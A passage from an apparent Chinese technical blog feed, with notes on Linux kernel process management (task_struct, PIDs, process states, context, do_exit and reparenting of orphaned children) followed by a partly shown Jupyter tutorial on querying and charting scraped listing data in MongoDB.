                <img src="http://omunhj2f1.bkt.clouddn.com/EBC98897-3BCD-4B27-92C0-889C0CFC9FF1.png" alt="EBC98897-3BCD-4B27-92C0-889C0CFC9FF1" title="" class="">
                <p>EBC98897-3BCD-4B27-92C0-889C0CFC9FF1</p>
            </figure>
<p>每个任务的thread_info结构在它的内核栈的尾端分配。结构中的task域中存放的是指向task_struct的指针。</p>
<p>内核通过一个唯一的进程标识值或者PID来标识每个进程。PID是一个数，实际上就是一个int型。为了和老版Unix和Linux兼容，PID的最大值默认设置为32768（short int短整型的最大值），内核把每个PID存放在他们各自的进程描述符中。</p>
<p>新创建的进程的PID通常是前一个进程的PID+1，PID并非无限向上增长。PID有一个最大值上限，当超过了这个上限后，PID就开始循环使用已闲置的小PID号（循环的起点PID号根据不同操作系统而不同）。</p>
<p>系统管理员可以通过往<code>/proc/sys/kernel/pid_max</code>这个特殊文件写入一个更小的值来减小PID上限。64位系统PID最大值可以扩展到4194303。</p>
<p>在各PID中，较为特别的是0号PID和1号PID。PID为0者为交换进程，属于内核进程，负责<a href="https://zh.wikipedia.org/wiki/%E5%88%86%E9%A1%B5" target="_blank" rel="external">分页</a>任务；PID为1者则常为<a href="https://zh.wikipedia.org/wiki/Init" target="_blank" rel="external">init</a>进程，主要负责启动与关闭系统。值得一提的是，1号PID本来并非是特意为init进程预留的，而init进程之所以拥有这一PID，则是因为init即是内核创建的第一个进程。</p>
<p>在内核中，访问任务通常需要获得指向其task_struct的指针。实际上，内核中大部分处理进程的代码都是直接通过task_struct进行的，所以通过<a href="http://www.cnblogs.com/cherishui/p/4255690.html" target="_blank" rel="external">current宏</a>查找到当前正在运行的进程的进程描述符的速度就尤为重要。硬件体系结构不同，该宏的实现也不同。有的硬件体系结构专门拿出一个寄存器来存放task_struct的指针，用于加快访问的速度。而有些像x86这样寄存器并不富余的，就只能在内核栈的尾端创建thread_info结构，通过计算偏移间接查找task_struct结构。</p>
<h4 id="2-进程状态："><a href="#2-进程状态：" class="headerlink" title="2.进程状态："></a>2.进程状态：</h4><p>进程描述符中的state域描述了当前进程的当前状态。系统中的每个进程 都必然处于几种进程状态中的一种，该域的值也必为下列几种状态中的一种：</p>
<p>通过<code>ps aux</code>可以看到进程的状态。</p>
<p>O：进程正在处理器运行,这个状态从来没有见过.<br>S：休眠状态（sleeping）<br>R：等待运行（runable）R Running or runnable (on run queue) 进程处于运行或就绪状态<br>I：空闲状态（idle）<br>Z：僵尸状态（zombie）<br>T：跟踪状态（Traced）<br>B：进程正在等待更多的内存页<br>D: 不可中断的深度睡眠，一般由IO引起，同步IO在做读或写操作时，cpu不能做其它事情，只能等待，这时进程处于这种状态，如果程序采用异步IO，这种状态应该就很少见到了</p>
<p>其中就绪状态表示进程已经分配到除CPU以外的资源，等CPU调度它时就可以马上执行了。运行状态就是正在运行了，获得包括CPU在内的所有资源。等待状态表示因等待某个事件而没有被执行，这时候不耗CPU时间，而这个时间有可能是等待IO、申请不到足够的缓冲区或者在等待信号。下面是一个关系图</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/918777F0-F802-49CD-9B45-5AA56CDBC383.png" alt="918777F0-F802-49CD-9B45-5AA56CDBC383" title="" class="">
                <p>918777F0-F802-49CD-9B45-5AA56CDBC383</p>
            </figure>
<p>内核中经常需要设置当前进程的状态。这时最好用set_task_state(task,state)函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">set_task_state(task, state);         <span class="comment">/*将任务task的状态设置为state*/</span></div></pre></td></tr></table></figure>
<p>该函数将指定的进程指定为指定的状态，必要的时候，他会设置内存屏障来强制其他处理器作重新排序（一般只有在对称多处理机制系统下才有这个必要）否则它等价于：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">task-&gt;state = state;</div></pre></td></tr></table></figure>
<h4 id="上下文的概念"><a href="#上下文的概念" class="headerlink" title="上下文的概念"></a>上下文的概念</h4><p> 内核空间和用户空间是现代<a href="http://lib.csdn.net/base/operatingsystem" target="_blank" rel="external">操作系统</a>的两种工作模式，内核模块运行在内核空间，而用户态应用程序运行在用户空间。它们代表不同的级别，而对系统资源具有不同的访问权限。内核模块运行在最高级别（内核态），这个级下所有的操作都受系统信任，而应用程序运行在较低级别（用户态）。在这个级别，处理器控制着对硬件的直接访问以及对内存的非授权访问。内核态和用户态有自己的内存映射，即自己的地址空间。</p>
<p>​         其中处理器总处于以下状态中的一种：</p>
<p>​        <strong>内核态</strong>，运行于<strong>进程上下文</strong>，内核代表进程运行于内核空间；</p>
<p>​        <strong>内核态</strong>，运行于<strong>中断上下文</strong>，内核代表硬件运行于内核空间；</p>
<p>​        <strong>用户态</strong>，运行于用户空间。</p>
<p>　　系统的两种不同运行状态，才有了上下文的概念。用户空间的应用程序，如果想请求系统服务，比如操作某个物理设备，映射设备的地址到用户空间，必须通过系统调用来实现。（系统调用是操作系统提供给用户空间的接口函数）。</p>
<p>​       通过系统调用，用户空间的应用程序就会进入内核空间，由内核代表该进程运行于内核空间，这就涉及到上下文的切换，用户空间和内核空间具有不同的 地址映射，通用或专用的寄存器组，而用户空间的进程要传递很多变量、参数给内核，内核也要保存用户进程的一些寄存器、变量等，以便系统调用结束后回到用户 空间继续执行，</p>
<h4 id="进程上下文"><a href="#进程上下文" class="headerlink" title="进程上下文"></a>进程上下文</h4><p>可执行代码是进程的重要组成部分，这些代码从一个可执行文件载入到进程的地址空间去执行。一般程序在用户空间执行。当一个程序执行了系统调用或者触发了某个异常，他就陷入内核空间。此时，我们称内核”代表进程执行”并处于进程上下文中。除非此间隙有更高优先级的进程需要执行并由调度器作出相关调整，否则在内核退出的时候，程序恢复在用户空间会继续执行。</p>
<p>系统调用和异常处理程序是对内核明确的接口。进程只有通过这些接口才能陷入内核执行——对于内核的所有访问度必须通过这些接口。</p>
<p>所谓的进程上下文，就是一个进程在执行的时候，CPU的所有寄存器中的值、进程的状态以及堆栈上的内容，当内核需要切换到另一个进程时，它 需要保存当前进程的所有状态，即保存当前进程的进程上下文，以便再次执行该进程时，能够恢复切换时的状态，继续执行。</p>
<p>  一个进程的上下文可以分为三个部分:<strong>用户级上下文</strong>、<strong>寄存器上下文</strong>以及<strong>系统级上下文</strong>。</p>
<p>​       1）用户级上下文: 正文、数据、用户堆栈以及共享存储区；</p>
<p>​       2）寄存器上下文: 通用寄存器、程序寄存器(IP)、处理器状态寄存器(EFLAGS)、栈指针(ESP)；</p>
<p>​       3）系统级上下文: 进程控制块task_struct、内存管理信息(mm_struct、vm_area_struct、pgd、pte)、内核栈。</p>
<p>当发生进程调度的时候，进行进程切换就是上下文切换</p>
<p>操作系统必须对上面提到的全部信息进行切换，新调度的进程才能运行。而<strong>系统调用进行的是模式切换(mode switch)</strong>。模式切换与进程切换比较起来，容易很多，而且节省时间，因为<strong>模式切换最主要的任务只是切换进程寄存器上下文的切换</strong>。</p>
<p> 进程上下文主要是异常处理程序和内核线程。内核之所以进入进程上下文是因为进程自身的一些工作需要在内核中做。例如，系统调用是为当前进程服务的，异常通常是处理进程导致的错误状态等。所以在进程上下文中引用current是有意义的。</p>
<h4 id="进程家族树"><a href="#进程家族树" class="headerlink" title="进程家族树"></a>进程家族树</h4><p>Unix系统的进程之间存在着一个明显的继承关系，在Linux系统中也会如此。所有的进程都是PID为1的init进程的后代。内核在系统启动的最后阶段启动init进程。该进程读取系统的初始化脚本（initscript）并执行其他的相关程序，最后完成系统启动的整个过程。</p>
<p>系统的每一个进程都有一个父进程，相应的，每个进程也可以有0个或多个子进程。拥有同一个父进程的所有进程被称作兄弟，进程之间的关系存放在进程描述符中。每个task_struct中包含一个指向它父进程的task_struct叫做parent的指针，还包含一个称作children的子进程链表。所以，对于当前进程，可以通过下面的代码获得其父进程的进程描述符：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> task_struct   *my_parent = current-&gt;parent;</div><div class="line"><span class="comment">//同样，也可以按照下面的方式依次访问子进程</span></div><div class="line"><span class="keyword">struct</span> task_struct *task;</div><div class="line"><span class="keyword">struct</span> list_head *<span class="built_in">list</span>;</div><div class="line"></div><div class="line">list_for_each(<span class="built_in">list</span>, &amp;current-&gt;children) &#123;</div><div class="line">  task = list_entry(<span class="built_in">list</span>, <span class="keyword">struct</span> task_struct, sibling);</div><div class="line">  <span class="comment">/*task指向当前的某个子进程*/</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>init进程描述符是作为init_task静态分配的。下面的代码可以很好的演示所有进程之间的关系</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> task_struct *task;</div><div class="line"><span class="keyword">for</span> ( task = current ; task != &amp;init_task ; task = task-&gt;parent )</div><div class="line"><span class="comment">/*task现在指向init*／</span></div></pre></td></tr></table></figure>
<p>实际上，你可以通过这种继承体系从系统的任何一个进程出发查找到任意指定的其他进程。但大多数时候，只需要通过简单的重复方式就可以遍历系统中的所有进程。这非常容易做到，因为任务队列本来就是一个双向的循环链表。对于给定的进程，获取链表的下一个进程：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">list_entry(task-&gt;tasks.next, <span class="keyword">struct</span> task_struct, tasks)</div><div class="line"><span class="comment">//获取前一个进程的方法与之相同</span></div><div class="line">list_entry(task-&gt;tasks.prev, <span class="keyword">struct</span> task_struct, tasks)</div></pre></td></tr></table></figure>
<p>注意⚠️：在一个拥有大量进程的系统中通过重复来遍历所有进程的代价很大，所以没有必要的话不要这样做。</p>
<h2 id="进程终结"><a href="#进程终结" class="headerlink" title="进程终结"></a>进程终结</h2><p>不管是什么都不是永恒的，总会走向消亡，进程也是，当一个进程消亡的时候，内核必须释放它所占有资源并将这个消息告知它的父进程，一般来说。进程的析构是自身引起的。他发生在进程调用<code>exit()</code>系统调用的时候，既可能显式调用，也可能隐式的从某个程序的主函数返回。当进程接收到它既不能处理也不能忽略的信号或者异常的时候，他还可能被动的终结。那么不管进程是怎么终结的，该任务都要靠<code>do_exit()</code>来完成，接下来就是他要做的事情：</p>
<ol>
<li>将<code>task_struct</code>中的标志成员设置为<code>PF_EXITING</code></li>
<li>调用<code>del_timer_sync()</code>删除任一内核定时器。根据返回的结果，它确保没有定时器在排队，也没有定时器处理程序在运行</li>
<li>如果BSD的进程记账功能是开启的，<code>do_exit()</code>调用<code>acct_update_integrals</code>来输出记账信息。</li>
<li>然后调用<code>exit_mm()</code>函数释放进程占用的<code>mm_struct</code>，如果没有别的进程在占用，就彻底释放掉</li>
<li>接下来调用<code>sem_exit()</code>函数。如果进程排队等号IPC信号，它则离开队列</li>
<li>调用<code>exit_files()</code>和<code>exit_fs()</code>，以分别递减文件描述符、文件系统数据的引用计数。如果其中某个引用计数的数值降为0，同样也释放掉对应的资源</li>
<li>接着将<code>task_struct</code>中的<code>exit_code</code>成员中的任务退出码置为由<code>exit()</code>提供的退出代码，或者完成任何由内核机制规定的退出动作。退出代码存放在这里留作给父进程作为检索</li>
<li>调用<code>exit_notify()</code>向父进程发出信号，给这个将死进程的子进程找个下家，也就是养父，并将进程状态设置为<code>EXIT_ZOMBIE</code>(也是保存在task_struct中的一个属性)</li>
<li><code>do_exit()</code>调用<code>schedule()</code>切换到新进程，因为僵尸状态的进程已经不会再参与调度了，所以这也是进程所执行的生命中最后一段代码，<code>do_exit()</code>不会返回了。</li>
</ol>
<p>到现在为止，和这个即将被终结的进程相关的资源都被释放掉了，或者对应的引用计数减1，进程已经不可运行并且处于退出状态。它所剩下的就只有内核栈，<code>task_struct</code>、<code>thread_info</code>这些东西了。此时进程的唯一存在目的就是向它的父进程提供信息。父进程检索到信息之后，告诉内核那都是无关的信息，然后剩下的那点东西也会被释放，归还给系统。但是这里还没有结束，还记得我们之间创建进程的时候会给它分配一个唯一的进程描述符，也就是我们通常说的pid号，这个显然也是应该在进程被结束之后被终结掉，那么这个的回收的过程就参考下面这张图：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/FA58DA92EDFC72A2FD6631E16EBE4D7A.png" alt="FA58DA92EDFC72A2FD6631E16EBE4D7A.png" title="" class="">
                <p>FA58DA92EDFC72A2FD6631E16EBE4D7A.png</p>
            </figure>
<h4 id="子进程的分配"><a href="#子进程的分配" class="headerlink" title="子进程的分配"></a>子进程的分配</h4><p>前面已经说过当一个进程终结的时候还有一个操作就是将它的子进程分给其他的进程，不然这些成为孤儿的子进程就会在退出的时候永远的处于僵死态，因为这个时候并没有一个父进程去向内核告知说这个子进程剩下的内存已经可以回收掉了，这样就会白白消耗内存。那么是如何去寻找爸爸的呢？解决方法就是给子进程在当前的线程组找一个线程作为父亲，如果不行的话，就只能让<code>init</code>进程作为他们的父进程了，在<code>do_exit()</code>中会调用<code>exit_notify()</code>方法，该函数会调用<code>forget_original_parent()</code>，之后就会调用爸爸去哪了的代码了，那么请看看这段爸爸去哪的代码:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">struct</span> task_struct *<span class="title">find_new_reaper</span><span class="params">(<span class="keyword">struct</span> task_struct *father)</span></span>&#123;</div><div class="line">  <span class="keyword">struct</span> pid_namespace *pid_ns = task_active_pid_ns(father);</div><div class="line">  <span class="keyword">struct</span> task_struct *thread;</div><div class="line">  </div><div class="line">  thread = father;</div><div class="line">  while_each_thread(father, thread)&#123;</div><div class="line">    <span class="keyword">if</span>(thread-&gt;flag &amp; PF_EXITING)</div><div class="line">      <span class="keyword">continue</span>;</div><div class="line">    <span class="keyword">if</span>(unlikely(pid_ns-&gt;child_paper == father))</div><div class="line">      pid_ns-&gt;child_paper = thread;</div><div class="line">    <span class="keyword">return</span> thread;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span>(unlikely(pid_ns-&gt;child_paper == father))&#123;</div><div class="line">    write_unlock_irq(&amp;tasklist_lock);</div><div class="line">    <span class="keyword">if</span>(unlikely(pid_ns == &amp;init_pid_ns))</div><div class="line">      panic(<span class="string">"Attempted to kill init"</span>);</div><div class="line">    zap_pid_ns_processes(pid_ns);</div><div class="line">    write_lock_irq(&amp;tasklist_lock);</div><div class="line">    pid_ns-&gt;child_paper = init_pid_ns.child_paper;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> pid_ns-&gt;child_paper;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这段代码试图找到当前进程所在的线程组中的其他进程，但是如果没有找到的话，就只能找<code>init</code>进程来接盘了。我们会注意到一点也就是这个<code>task_struct</code>有两个属性都和<code>parent</code>有关，一个是<code>parent</code>，另一个是<code>real_parent</code>，简单的来说就是前者指向的是跟踪(trace)自己的进程，后者是<code>fork</code>它的那个进程，找到父亲之后，接下来要干什么呢？就是登记一下户口，也就是设置新的父进程:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">reaper = find_new_paper(father);</div><div class="line">list_for_each_entry_safe(p, n, &amp;father-&gt;children, sibling)&#123;</div><div class="line">  p-&gt;real_parent = reaper;</div><div class="line">  <span class="keyword">if</span>(p-&gt;parent == father)&#123;</div><div class="line">    BUG_ON(p-&gt;ptrace);</div><div class="line">    p-&gt;parent = p-&gt;real_parent;</div><div class="line">  &#125;</div><div class="line">  reparent_thread(p, father);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>接下来还要为<code>ptraced</code>的子进程去寻找父亲，那么这里就会有一个疑问，为什么我们会需要这个<code>ptraced</code>调试进程呢？这里是因为在以往的时候，我们每次终结掉一个进程，都要去遍历整个链表去寻找这个被终结进程的儿子们，但是这里只需要两个链表，就是子进程链表和<code>ptrace</code>的子进程链表，这个时候我们再需要找这些儿子的时候直接通过被追踪进程的兄弟进程就行了(pre&amp;next)，然后根据它的属性再去修改这些儿子的父亲就会减轻遍历带来的消耗了，这也是一个比较优秀的设计。</p>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="0" height="0" src="//music.163.com/outchain/player?type=2&id=34341360&auto=1&height=66"></iframe>]]></content>
      
        <categories>
            
            <category> 系统调用 内核空间 用户空间 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[jupyter笔记本基本使用]]></title>
      <url>/2017/05/18/jupyter%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
      <content type="html"><![CDATA[<p>jupyter笔记本使用（爬虫）<br><a id="more"></a></p>
<h1 id="jupyter笔记本使用"><a href="#jupyter笔记本使用" class="headerlink" title="jupyter笔记本使用"></a>jupyter笔记本使用</h1><h2 id="1-在交互式笔记本中进行数据查找"><a href="#1-在交互式笔记本中进行数据查找" class="headerlink" title="1.在交互式笔记本中进行数据查找"></a>1.在交互式笔记本中进行数据查找</h2><blockquote>
<p>导入模块和数据库</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt; <span class="keyword">import</span> pymongo</div><div class="line">&gt; client = pymongo.MongoClient(<span class="string">'localhost'</span>, <span class="number">27017</span>)</div><div class="line">&gt; ganji = client[<span class="string">'ganji'</span>]</div><div class="line">&gt; item_info = ganji[<span class="string">'item_info'</span>]</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>&gt;</p>
<blockquote>
<p>对数据库进行查询</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt; <span class="keyword">for</span> i <span class="keyword">in</span> item_info.find().limit(<span class="number">300</span>):</div><div class="line">&gt; 	print(i[<span class="string">'area'</span>])</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>&gt;</p>
<blockquote>
<p>将area为None的地区替换为不明,去掉标点符号</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&gt; <span class="comment">#先导入一个新模块</span></div><div class="line">&gt; <span class="keyword">from</span> string <span class="keyword">import</span> punctuation</div><div class="line">&gt; <span class="comment">#索引的代码优化</span></div><div class="line">&gt; <span class="keyword">for</span> i <span class="keyword">in</span> item_info.find():</div><div class="line">&gt;     <span class="keyword">if</span> i[<span class="string">'area'</span>]:</div><div class="line">&gt;         area = [i <span class="keyword">for</span> i <span class="keyword">in</span> i[<span class="string">'area'</span>] <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> punctuation]</div><div class="line">&gt;     <span class="keyword">else</span>:</div><div class="line">&gt;         area = [<span class="string">'不明'</span>]</div><div class="line">&gt;     print(area)</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>&gt;</p>
<blockquote>
<p>使用find函数进行精确的查找：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&gt; <span class="keyword">import</span> pymongo</div><div class="line">&gt; client = pymongo.MongoClient(<span class="string">'localhost'</span>, <span class="number">27017</span>)</div><div class="line">&gt; ganji = client[<span class="string">'ganji'</span>]</div><div class="line">&gt; item_info = ganji[<span class="string">'item_info'</span>]</div><div class="line">&gt; <span class="comment">#第一个大括号内填写查找的条件，条件为空则是全部的数据，后面一个大括号内填写显示的条件，value为0表示不显示,$slice进行分片，返回可被分片数据中的第一个。</span></div><div class="line">&gt; <span class="comment">#注意，如果在属性的查找中加入具体的操作符，就会显示其他的属性，这是mongodb的特殊显示方式。</span></div><div class="line">&gt; <span class="keyword">for</span> i <span class="keyword">in</span> item_info.find(&#123;&#125;,&#123;<span class="string">'area'</span>:&#123;<span class="string">'$slice:1'</span>&#125;,<span class="string">'_id'</span>:<span class="number">0</span>,<span class="string">'price'</span>:<span class="number">0</span>&#125;)</div><div class="line">&gt; <span class="comment">#$in操作符表示只要包含两个中的一个即可</span></div><div class="line">&gt; <span class="keyword">for</span> i <span class="keyword">in</span> item_info.find(&#123;<span class="string">'pub_date'</span>:&#123;<span class="string">'$in'</span>:[<span class="number">2016</span>,<span class="number">2017</span>]&#125;&#125;,&#123;<span class="string">'area'</span>:&#123;<span class="string">'$slice:1'</span>&#125;,<span class="string">'_id'</span>:<span class="number">0</span>,<span class="string">'price'</span>:<span class="number">0</span>&#125;)</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>&gt;</p>
<blockquote>
</blockquote>
<h2 id="2-数据更新"><a href="#2-数据更新" class="headerlink" title="2.数据更新"></a>2.数据更新</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#将area为None的替换为不明</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> item_info.find():</div><div class="line">    <span class="keyword">if</span> i[<span class="string">'area'</span>]:</div><div class="line">        area = [i <span class="keyword">for</span> i <span class="keyword">in</span> i[<span class="string">'area'</span>] <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> punctuation]</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        area = [<span class="string">'不明'</span>]</div><div class="line">    item_info.update_one(&#123;<span class="string">'_id'</span>:i[<span class="string">'_id'</span>]&#125;, &#123;<span class="string">'$set'</span>:&#123;<span class="string">'area'</span>:area&#125;&#125;)</div></pre></td></tr></table></figure>
<h2 id="3-利用图表来进行数据的展示"><a href="#3-利用图表来进行数据的展示" class="headerlink" title="3.利用图表来进行数据的展示"></a>3.利用图表来进行数据的展示</h2><blockquote>
<p>环境准备：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt; pip3 install charts</div><div class="line">&gt; #由于版本问题，pip3获取的是对于python2.*版本兼容的模块包，所以我们需要cd到charts的目录下面进行版本更新，不然会疯狂的报错</div><div class="line">&gt; 2to3 -w *.py</div><div class="line">&gt; #这个命令是使本目录下所有的py文件更新到3.*版本</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>&gt;</p>
<blockquote>
<p>代码部分，<a href="http://www.cnblogs.com/tqsummer/archive/2010/12/27/1917927.html" target="_blank" rel="external">yield参考</a>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">&gt; <span class="comment">#统计地区的名字,set用于列表去重</span></div><div class="line">&gt; area_list = []</div><div class="line">&gt; <span class="keyword">for</span> i <span class="keyword">in</span> item_info.find():</div><div class="line">&gt;     area_list.append(i[<span class="string">'area'</span>][<span class="number">0</span>])</div><div class="line">&gt; area_index = list(set(area_list))</div><div class="line">&gt; <span class="comment">#计算出现的次数</span></div><div class="line">&gt; post_times = []</div><div class="line">&gt; <span class="keyword">for</span> index <span class="keyword">in</span> area_index:</div><div class="line">&gt;     post_times.append(area_list.count(index))</div><div class="line">&gt; <span class="comment">#将数据格式转换成可视化图表模式的代码</span></div><div class="line">&gt; <span class="function"><span class="keyword">def</span> <span class="title">data_gen</span><span class="params">(types)</span>:</span></div><div class="line">&gt;     length = <span class="number">0</span></div><div class="line">&gt;     <span class="keyword">if</span> length &lt;= len(area_index):</div><div class="line">&gt;     	<span class="keyword">for</span> area,times <span class="keyword">in</span> zip(area_index,post_times):</div><div class="line">&gt;         	data = &#123;</div><div class="line">&gt;           	<span class="string">'name'</span> : area,</div><div class="line">&gt;           	<span class="string">'data'</span> : [times],</div><div class="line">&gt;           	<span class="string">'type'</span> : types</div><div class="line">&gt;         	&#125;</div><div class="line">&gt;         	<span class="keyword">yield</span> data</div><div class="line">&gt;         	length += <span class="number">1</span></div><div class="line">&gt; <span class="comment">#最后生成图表</span></div><div class="line">&gt; series = [data <span class="keyword">for</span> data <span class="keyword">in</span> data_gen(<span class="string">'column'</span>)]</div><div class="line">&gt; charts.plot(series, show=<span class="string">'inline'</span>, options=dict(title=dict(text=<span class="string">'七日内二手物品销售统计'</span>)))</div><div class="line">&gt;</div></pre></td></tr></table></figure>
</blockquote>
<p>&gt;</p>
<blockquote>
<figure class="image-box">
                <img src="http://omg5mjb8v.bkt.clouddn.com/252E2171-55DD-407C-82B7-A9BAA6F7E82D.png" alt="" title="" class="">
                <p></p>
            </figure>
</blockquote>
<h2 id="4-进行数据的格式修改并更新"><a href="#4-进行数据的格式修改并更新" class="headerlink" title="4.进行数据的格式修改并更新"></a>4.进行数据的格式修改并更新</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#e.g:将‘-’替换为‘.‘</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> item_info.find():</div><div class="line">    frags = i[pub_date].split(<span class="string">'-'</span>)</div><div class="line">    <span class="keyword">if</span> len(frags) == <span class="number">1</span>:</div><div class="line">        date = frags</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        date = &#123;&#125;.&#123;&#125;.&#123;&#125;.format(frags[<span class="number">1</span>],frags[<span class="number">2</span>],frags[<span class="number">3</span>])</div><div class="line">    item_info.update(&#123;<span class="string">'_id'</span>:i[<span class="string">'_id'</span>]&#125;,&#123;<span class="string">'$set'</span>:&#123;<span class="string">'pub_date'</span>:date&#125;&#125;)<span class="number">5.</span>date函数的使用</div></pre></td></tr></table></figure>
<h2 id="5-使用date函数制作图表datetime模块"><a href="#5-使用date函数制作图表datetime模块" class="headerlink" title="5.使用date函数制作图表datetime模块"></a>5.使用date函数制作图表<a href="https://my.oschina.net/whp/blog/130710" target="_blank" rel="external">datetime模块</a></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#打印一段时间内的连续日期样例</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_all_dates</span><span class="params">(date1,date2)</span>:</span></div><div class="line">    the_date = date(int(date1.split(<span class="string">'.'</span>)[<span class="number">0</span>]),int(date1.split(<span class="string">'.'</span>)[<span class="number">1</span>]),int(date1.split(<span class="string">'.'</span>)[<span class="number">2</span>]))</div><div class="line">    end_date = date(int(date2.split(<span class="string">'.'</span>)[<span class="number">0</span>]),int(date2.split(<span class="string">'.'</span>)[<span class="number">1</span>]),int(date2.split(<span class="string">'.'</span>)[<span class="number">2</span>]))</div><div class="line">    days = timedelta(days=<span class="number">1</span>)</div><div class="line">    <span class="keyword">while</span> the_date &lt;= end_date:</div><div class="line">            <span class="keyword">yield</span> the_date.strftime(<span class="string">'%Y-%m-%d'</span>)</div><div class="line">            the_date = the_date + days</div></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#制作图表部分的代码</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data_within</span><span class="params">(date1,date2,areas)</span>:</span></div><div class="line">    <span class="keyword">for</span> area <span class="keyword">in</span> areas:</div><div class="line">        area_day_posts = []</div><div class="line">        <span class="keyword">for</span> day <span class="keyword">in</span> get_all_dates(date1,date2):</div><div class="line">            a = list(item_info.find(&#123;<span class="string">'pub_date'</span>:date,<span class="string">'area'</span>:area&#125;))</div><div class="line">            each_posts = len(a)</div><div class="line">            